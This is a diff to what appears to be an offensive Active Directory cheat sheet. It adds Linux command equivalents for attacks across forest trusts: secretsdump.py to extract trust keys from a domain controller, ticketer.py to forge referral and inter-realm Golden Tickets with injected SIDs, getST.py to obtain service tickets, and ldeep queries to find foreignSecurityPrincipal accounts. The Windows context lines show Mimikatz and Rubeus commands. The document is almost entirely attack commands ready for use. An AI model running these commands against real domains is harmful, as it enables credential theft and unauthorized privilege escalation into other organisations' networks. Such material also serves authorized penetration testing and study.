@@ -12,6 +12,10 @@ OR
 
     Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
+## Linux
+
+    secretsdump.py -just-dc-user '<current_forest/target_forest$>' domain.local/Administrator:password@<DC>
+
 ### 2) If no filtering: forge a referral ticket or an inter-realm Golden Ticket and request for a ST
 
 ##### Referral ticket with the Trust Key
@@ -28,6 +32,20 @@ OR
 
     ./Rubeus.exe asktgs /ticket:trust_forest.kirbi /service:cifs/dc.targetDomain.local /dc:dc.targetDomain.local /ptt
 
+## Linux
+
+#Referral ticket
+
+    ticketer.py -domain domain.local -domain-sid <domain_SID> -extra-sid <target_domain_SID>-<RID> -aesKey <aes_trust_key> -spn "krbtgt/targetDomain.local" <target_user>
+
+##### Inter-realm Golden Ticket
+    
+    ticketer.py -domain domain.local -domain-sid <domain_SID> -extra-sid <target_domain_SID>-<RID> -nthash <krbtgt_hash> <target_user>
+
+    export KRB5CCNAME=./ticket.ccache
+
+    getST.py -k -no-pass -spn CIFS/dc.targetDomain.local -dc-ip <target_DC_IP> targetDomain.local/user
+
 ### 3) If there is SID filtering, same thing as above but with RID > 1000 (for example, Exchange related groups are sometimes highly privileged, and always with a RID > 1000). Otherwise, get the foreignSecurityPrincipal. These users of the current domain are also members of the trusting forest, and they can be members of interesting groups:
 
 ##### These SIDs are members of the target domain
@@ -40,6 +58,15 @@ OR
 
 Then, it is possible to forge a referral ticket for this user and access the target forest with its privileges.
 
+## Linux
+
+##### These SIDs are members of the target domain
+
+    ldeep ldap -u user1 -p password -d domain.local -s <target_LDAP_server_IP> search '(objectclass=foreignSecurityPrincipal)' | jq '.[].objectSid'
+
+##### The found SIDs can be search in the current forest
+
+    ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> search '(objectSid=<object_SID>)'
 
 #### 1) Golden Ticket
 
